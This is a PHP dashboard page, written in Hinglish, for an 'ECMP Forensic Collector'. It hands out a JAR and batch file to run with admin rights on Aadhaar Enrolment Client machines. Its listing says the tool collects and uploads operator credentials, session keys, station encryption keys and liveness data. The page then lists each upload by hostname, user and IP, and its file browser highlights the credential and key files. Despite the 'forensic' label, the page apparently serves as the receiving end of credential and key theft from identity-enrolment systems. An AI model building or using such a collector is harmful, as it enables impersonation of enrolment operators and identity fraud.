<?php
include('layout/header.php');
if(!isset($_SESSION['user_token'])){
    header("location:" . $basePath . "login.php");
    exit();
}

$collections_dir = __DIR__ . '/collections/';
if(!is_dir($collections_dir)) mkdir($collections_dir, 0755, true);

// ─── AJAX Actions ────────────────────────────────────────────────────────────
$action = $_GET['action'] ?? '';

if($action === 'list'){
    header('Content-Type: application/json');
    $cols = [];
    foreach(glob($collections_dir . '*.zip') as $f){
        $meta_file = $f . '.meta.json';
        $meta = file_exists($meta_file) ? json_decode(file_get_contents($meta_file), true) : [];
        $cols[] = [
            'id'           => basename($f, '.zip'),
            'filename'     => basename($f),
            'originalName' => $meta['originalName'] ?? basename($f),
            'uploadedAt'   => $meta['uploadedAt']   ?? date('c', filemtime($f)),
            'sizeBytes'    => filesize($f),
            'hostname'     => $meta['hostname']     ?? '',
            'username'     => $meta['username']     ?? '',
            'ipAddress'    => $meta['ipAddress']    ?? '',
            'ecmpPath'     => $meta['ecmpPath']     ?? '',
            'fileCount'    => $meta['fileCount']    ?? 0,
        ];
    }
    usort($cols, fn($a,$b) => strcmp($b['uploadedAt'], $a['uploadedAt']));
    echo json_encode(['collections' => $cols]);
    exit();
}

if($action === 'browse'){
    header('Content-Type: application/json');
    $id      = preg_replace('/[^a-zA-Z0-9_\-]/', '', $_GET['id'] ?? '');
    $zipfile = $collections_dir . $id . '.zip';
    if(!file_exists($zipfile)){ echo json_encode(['error'=>'Not found']); exit(); }

    $path = $_GET['path'] ?? '';
    $zip  = new ZipArchive();
    if($zip->open($zipfile) !== true){ echo json_encode(['error'=>'Cannot open ZIP']); exit(); }

    if($path !== ''){
        $idx = $zip->locateName($path);
        if($idx === false){ echo json_encode(['error'=>'File not in ZIP']); exit(); }
        $content = $zip->getFromIndex($idx);
        $is_binary = !mb_check_encoding($content, 'UTF-8') || preg_match('/[\x00-\x08\x0B\x0C\x0E-\x1F]/', $content);
        echo json_encode([
            'path'    => $path,
            'content' => $is_binary ? base64_encode($content) : $content,
            'type'    => $is_binary ? 'binary' : 'text',
        ]);
        $zip->close(); exit();
    }

    $entries = [];
    for($i = 0; $i < $zip->numFiles; $i++){
        $stat = $zip->statIndex($i);
        $entries[] = [
            'name'           => $stat['name'],
            'isDir'          => substr($stat['name'], -1) === '/',
            'size'           => $stat['size'],
            'compressedSize' => $stat['comp_size'],
        ];
    }
    $zip->close();
    echo json_encode(['entries' => $entries]);
    exit();
}

if($action === 'delete' && $_SERVER['REQUEST_METHOD'] === 'POST'){
    header('Content-Type: application/json');
    $id      = preg_replace('/[^a-zA-Z0-9_\-]/', '', $_POST['id'] ?? '');
    $zipfile = $collections_dir . $id . '.zip';
    $metafile= $zipfile . '.meta.json';
    if(file_exists($zipfile))  unlink($zipfile);
    if(file_exists($metafile)) unlink($metafile);
    echo json_encode(['ok' => true]);
    exit();
}

if($action === 'download'){
    $id      = preg_replace('/[^a-zA-Z0-9_\-]/', '', $_GET['id'] ?? '');
    $zipfile = $collections_dir . $id . '.zip';
    if(!file_exists($zipfile)){ http_response_code(404); exit('Not found'); }
    $meta_file = $zipfile . '.meta.json';
    $meta = file_exists($meta_file) ? json_decode(file_get_contents($meta_file), true) : [];
    $fname = $meta['originalName'] ?? basename($zipfile);
    header('Content-Type: application/zip');
    header('Content-Disposition: attachment; filename="' . $fname . '"');
    header('Content-Length: ' . filesize($zipfile));
    readfile($zipfile);
    exit();
}
// ─────────────────────────────────────────────────────────────────────────────
?>

<div class="content" style="min-height:610px;">
<div class="animated fadeIn">
<div class="container-fluid">

<div class="row mb-3 mt-2">
    <div class="col-12 d-flex align-items-center justify-content-between flex-wrap" style="gap:10px;">
        <div>
            <h4 class="mb-0" style="font-weight:700;">
                <i class="fa fa-archive text-primary"></i> ECMP Forensic Collector
            </h4>
            <small class="text-muted">ECMP machine se conf/data/session/station/lvs/operator folders collect karke server par upload karo</small>
        </div>
        <button class="btn btn-sm btn-outline-secondary" onclick="loadCollections()">
            <i class="fa fa-refresh"></i> Refresh
        </button>
    </div>
</div>

<!-- JAR Download + Instructions -->
<div class="card mb-4" style="border:1px solid #2980b9;border-radius:10px;">
    <div class="card-header" style="background:linear-gradient(135deg,#1a3a5c,#2980b9);color:#fff;border-radius:10px 10px 0 0;">
        <strong><i class="fa fa-download"></i> JAR Download + Instructions</strong>
    </div>
    <div class="card-body">
        <div class="d-flex flex-wrap mb-3" style="gap:10px;">
            <a href="downloads/EcmpCollector.jar" download="EcmpCollector.jar" class="btn btn-primary btn-sm font-weight-bold">
                <i class="fa fa-download"></i> EcmpCollector.jar v2.2
            </a>
            <a href="downloads/Run.bat" download="Run.bat" class="btn btn-success btn-sm font-weight-bold">
                <i class="fa fa-download"></i> Run.bat Download
            </a>
        </div>

        <div class="p-3 rounded mb-3" style="background:#f8f9fa;border:1px solid #dee2e6;">
            <p class="mb-2 font-weight-bold text-warning"><i class="fa fa-list-ol"></i> ECMP Machine Par Kaise Chalayein:</p>
            <ol class="mb-2" style="padding-left:18px;">
                <li class="mb-1">
                    <strong>EcmpCollector.jar</strong> aur <strong>Run.bat</strong> dono download karo
                </li>
                <li class="mb-1">Dono files ko ek folder mein rakho (jaise Desktop par)</li>
                <li class="mb-1">
                    <strong class="text-success">Run.bat</strong> double-click karo — local ECMP JRE auto-use hoga
                </li>
                <li class="mb-1">
                    <div class="p-2 rounded mt-1 mb-1" style="background:#1e1e1e;font-family:monospace;font-size:11px;color:#4ec9b0;">
                        <span class="text-muted"># Ya CMD se manually run karo (ECMP local JRE):</span><br>
                        "C:\UID Authority of India\Aadhaar Enrolment Client\jre\bin\java.exe" -jar EcmpCollector.jar
                    </div>
                    <span class="text-danger" style="font-size:12px;">
                        <i class="fa fa-exclamation-triangle"></i> LVS folder ke liye Admin rights se run karo (qssitvs service control)
                    </span>
                </li>
                <li class="mb-1">Automatic upload ho jayega — progress screen par dikhega</li>
                <li>Yahan page refresh karo — collection neeche dikhegi</li>
            </ol>
        </div>

        <div class="p-3 rounded" style="background:#f8f9fa;border:1px solid #dee2e6;">
            <p class="mb-2 font-weight-bold"><i class="fa fa-folder-open text-warning"></i> Kya Collect Hoga (v2.2 — Targeted, JAR auto-detects ECMP path):</p>
            <table class="table table-sm table-borderless mb-1" style="font-size:13px;">
                <tbody>
                    <?php
                    $collect_items = [
                        ['conf/',                 'userCredentials.xml, settings files'],
                        ['data/userCredentials.xml', 'Operator credentials (28 KB)'],
                        ['data/session/',         'Session keys (.dat files)'],
                        ['data/station/',         'key.json, registration.json, datakey.json'],
                        ['data/lvs/',             'LVS liveness data (qssitvs service stop/start)'],
                        ['data/operators/',       'Operator sync details'],
                        ['_machine_info.txt',     'Hostname, IP, paths, Java info'],
                    ];
                    foreach($collect_items as $item):
                    ?>
                    <tr>
                        <td style="font-family:monospace;color:#2980b9;white-space:nowrap;width:1%;">
                            <?= htmlspecialchars($item[0]) ?>
                        </td>
                        <td class="text-muted">— <?= htmlspecialchars($item[1]) ?></td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
            <p class="mb-0 text-success" style="font-size:12px;">
                <i class="fa fa-check-circle"></i> Derby DB aur archive folders skip honge (faster + smaller ZIP)
            </p>
        </div>
    </div>
</div>

<!-- Collections List -->
<div class="card" style="border-radius:10px;">
    <div class="card-header d-flex align-items-center justify-content-between"
         style="background:linear-gradient(135deg,#1e3a2f,#27ae60);color:#fff;border-radius:10px 10px 0 0;">
        <strong><i class="fa fa-list"></i> Uploaded Collections <span id="col-count" class="badge badge-light ml-2">0</span></strong>
    </div>
    <div class="card-body p-2">
        <div id="collections-area">
            <div class="text-center text-muted py-5">
                <i class="fa fa-spinner fa-spin fa-2x mb-2"></i><br>Loading...
            </div>
        </div>
    </div>
</div>

</div>
</div>
</div>

<?php include('layout/footer.php'); ?>

<style>
.col-card { border:1px solid #dee2e6; border-radius:8px; margin-bottom:12px; overflow:hidden; }
.col-card-header { background:#f8f9fa; padding:12px 15px; display:flex; align-items:flex-start; justify-content:space-between; flex-wrap:wrap; gap:8px; }
.col-meta { font-size:12px; color:#6c757d; margin-top:4px; }
.col-meta span { margin-right:12px; }
.browse-area { border-top:1px solid #dee2e6; padding:15px; }
.entry-item { display:flex; align-items:center; justify-content:space-between; padding:4px 8px; border-radius:4px; font-family:monospace; font-size:12px; cursor:pointer; margin-bottom:2px; }
.entry-item:hover { background:#e9ecef; }
.entry-item.dir { background:#e8f4fd; color:#1a6fa6; cursor:default; }
.entry-item.important { background:#fff8e1; border:1px solid #ffc107; color:#856404; }
.entry-item.important:hover { background:#fff3cd; }
.file-content-box { background:#1e1e1e; color:#4ec9b0; font-family:monospace; font-size:11px; padding:12px; border-radius:6px; max-height:320px; overflow:auto; white-space:pre-wrap; word-break:break-all; }
.btn-xs { padding:2px 8px; font-size:11px; }
</style>

<script>
var allCollections = [];

function formatSize(bytes){
    if(bytes < 1024) return bytes + ' B';
    if(bytes < 1048576) return (bytes/1024).toFixed(1) + ' KB';
    return (bytes/1048576).toFixed(2) + ' MB';
}

function formatDate(iso){
    try{ return new Date(iso).toLocaleString('en-IN',{timeZone:'Asia/Kolkata'}); }
    catch(e){ return iso; }
}

function loadCollections(){
    fetch('new_operator.php?action=list')
        .then(r => r.json())
        .then(d => {
            allCollections = d.collections || [];
            renderCollections();
        })
        .catch(() => {
            document.getElementById('collections-area').innerHTML =
                '<div class="alert alert-danger m-3">Collections load nahi ho saki. Refresh karo.</div>';
        });
}

function renderCollections(){
    var area = document.getElementById('collections-area');
    document.getElementById('col-count').textContent = allCollections.length;
    if(allCollections.length === 0){
        area.innerHTML = '<div class="text-center text-muted py-5">' +
            '<i class="fa fa-inbox fa-3x mb-3 d-block"></i>' +
            '<p>Abhi koi collection nahi</p>' +
            '<small>JAR chalao aur upload ho jayega</small></div>';
        return;
    }
    var html = '';
    allCollections.forEach(function(col){
        html += '<div class="col-card" id="card-' + col.id + '">' +
            '<div class="col-card-header">' +
              '<div>' +
                '<span class="font-weight-bold" style="font-family:monospace;font-size:13px;">' + escHtml(col.originalName) + '</span> ' +
                '<span class="badge badge-success" style="font-size:10px;">&#10003; Uploaded</span>' +
                '<div class="col-meta">' +
                  (col.hostname ? '<span><i class="fa fa-desktop"></i> ' + escHtml(col.hostname) + '</span>' : '') +
                  (col.username ? '<span><i class="fa fa-user"></i> ' + escHtml(col.username) + '</span>' : '') +
                  (col.ipAddress ? '<span><i class="fa fa-globe"></i> ' + escHtml(col.ipAddress) + '</span>' : '') +
                  '<span><i class="fa fa-clock-o"></i> ' + formatDate(col.uploadedAt) + '</span>' +
                  '<span><i class="fa fa-archive"></i> ' + formatSize(col.sizeBytes) + '</span>' +
                  (col.fileCount ? '<span><i class="fa fa-file"></i> ' + col.fileCount + ' files</span>' : '') +
                '</div>' +
                (col.ecmpPath ? '<div style="font-family:monospace;font-size:11px;color:#2980b9;"><i class="fa fa-folder"></i> ' + escHtml(col.ecmpPath) + '</div>' : '') +
              '</div>' +
              '<div style="display:flex;gap:6px;flex-wrap:wrap;">' +
                '<a href="new_operator.php?action=download&id=' + col.id + '" class="btn btn-sm btn-outline-success btn-xs"><i class="fa fa-download"></i> Download</a>' +
                '<button class="btn btn-sm btn-outline-primary btn-xs" onclick="toggleBrowse(\'' + col.id + '\')"><i class="fa fa-search"></i> Browse</button>' +
                '<button class="btn btn-sm btn-outline-danger btn-xs" onclick="confirmDelete(\'' + col.id + '\', \'' + escHtml(col.originalName) + '\')"><i class="fa fa-trash"></i></button>' +
              '</div>' +
            '</div>' +
            '<div class="browse-area" id="browse-' + col.id + '" style="display:none;"></div>' +
        '</div>';
    });
    area.innerHTML = html;
}

function toggleBrowse(id){
    var area = document.getElementById('browse-' + id);
    if(area.style.display !== 'none'){
        area.style.display = 'none';
        area.innerHTML = '';
        return;
    }
    area.style.display = 'block';
    area.innerHTML = '<div class="text-center text-muted py-3"><i class="fa fa-spinner fa-spin"></i> Loading ZIP contents...</div>';
    fetch('new_operator.php?action=browse&id=' + id)
        .then(r => r.json())
        .then(d => renderBrowse(id, d.entries || []))
        .catch(() => { area.innerHTML = '<div class="alert alert-danger">Browse failed.</div>'; });
}

var importantPatterns = ['userCredentials','session','station','operator','lvs','data','_machine_info'];

function isImportant(name){
    return importantPatterns.some(function(p){ return name.toLowerCase().includes(p.toLowerCase()); });
}

function renderBrowse(id, entries){
    var area = document.getElementById('browse-' + id);
    var filterHtml = '<div class="d-flex mb-3" style="gap:8px;">' +
        '<input type="text" id="filter-' + id + '" class="form-control form-control-sm" placeholder="Filter files... (e.g. userCredentials, session)" oninput="filterEntries(\'' + id + '\')">' +
        '<button class="btn btn-sm btn-secondary" onclick="document.getElementById(\'filter-' + id + '\').value=\'\';filterEntries(\'' + id + '\')">Clear</button>' +
        '</div>';

    var listHtml = '<div id="entries-' + id + '" class="col-md-6" style="max-height:380px;overflow-y:auto;">' + buildEntryList(id, entries) + '</div>';
    var viewHtml = '<div class="col-md-6" id="fileview-' + id + '"><div class="text-muted text-center mt-4" style="font-size:12px;"><i class="fa fa-hand-pointer-o"></i> Kisi file par click karo content dekhne ke liye</div></div>';

    area.innerHTML = filterHtml +
        '<div class="row">' + listHtml + viewHtml + '</div>';

    area._entries = entries;
}

function buildEntryList(id, entries){
    if(entries.length === 0) return '<p class="text-muted text-center py-3" style="font-size:12px;">Koi file nahi</p>';
    var important = entries.filter(e => !e.isDir && isImportant(e.name));
    var others    = entries.filter(e => !important.includes(e));

    var html = '';
    if(important.length > 0){
        html += '<p style="font-size:11px;color:#856404;font-weight:bold;margin-bottom:4px;"><i class="fa fa-star"></i> Important Files</p>';
        important.forEach(function(e){
            html += '<div class="entry-item important" onclick="readFile(\'' + id + '\',\'' + escJs(e.name) + '\')">' +
                '<span class="flex-1" style="overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">' + escHtml(e.name) + '</span>' +
                '<span style="font-size:10px;color:#6c757d;margin-left:8px;flex-shrink:0;">' + formatSize(e.size) + '</span>' +
            '</div>';
        });
    }
    others.forEach(function(e){
        var cls = e.isDir ? 'dir' : '';
        var icon = e.isDir ? '&#128194;' : '&#128196;';
        html += '<div class="entry-item ' + cls + '"' + (!e.isDir ? ' onclick="readFile(\'' + id + '\',\'' + escJs(e.name) + '\')"' : '') + '>' +
            '<span style="overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">' + icon + ' ' + escHtml(e.name) + '</span>' +
            (!e.isDir ? '<span style="font-size:10px;color:#6c757d;margin-left:8px;flex-shrink:0;">' + formatSize(e.size) + '</span>' : '') +
        '</div>';
    });
    return html;
}

function filterEntries(id){
    var filter = document.getElementById('filter-' + id).value.toLowerCase();
    var area = document.getElementById('browse-' + id);
    var entries = area._entries || [];
    var filtered = filter ? entries.filter(e => e.name.toLowerCase().includes(filter)) : entries;
    document.getElementById('entries-' + id).innerHTML = buildEntryList(id, filtered);
}

function readFile(id, path){
    var view = document.getElementById('fileview-' + id);
    view.innerHTML = '<div class="text-center text-muted py-3"><i class="fa fa-spinner fa-spin"></i> Loading...</div>';
    fetch('new_operator.php?action=browse&id=' + id + '&path=' + encodeURIComponent(path))
        .then(r => r.json())
        .then(d => {
            var content = d.type === 'binary'
                ? '[Binary file]\nBase64 preview:\n' + (d.content || '').substring(0, 500) + '...'
                : (d.content || '(empty)');
            view.innerHTML =
                '<div class="d-flex align-items-center justify-content-between mb-2">' +
                  '<small class="text-primary" style="font-family:monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">' + escHtml(d.path) + '</small>' +
                  '<button class="btn btn-xs btn-outline-secondary ml-2" onclick="document.getElementById(\'fileview-' + id + '\').innerHTML=\'\'">&#10005;</button>' +
                '</div>' +
                '<div class="file-content-box">' + escHtml(content) + '</div>';
        })
        .catch(() => { view.innerHTML = '<div class="alert alert-danger">File read failed.</div>'; });
}

function confirmDelete(id, name){
    if(confirm('Delete "' + name + '"? Yeh permanent hai!')){
        var fd = new FormData();
        fd.append('id', id);
        fetch('new_operator.php?action=delete', { method:'POST', body:fd })
            .then(() => loadCollections())
            .catch(() => alert('Delete failed'));
    }
}

function escHtml(s){
    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}
function escJs(s){
    return String(s).replace(/\\/g,'\\\\').replace(/'/g,"\\'");
}

loadCollections();
</script>
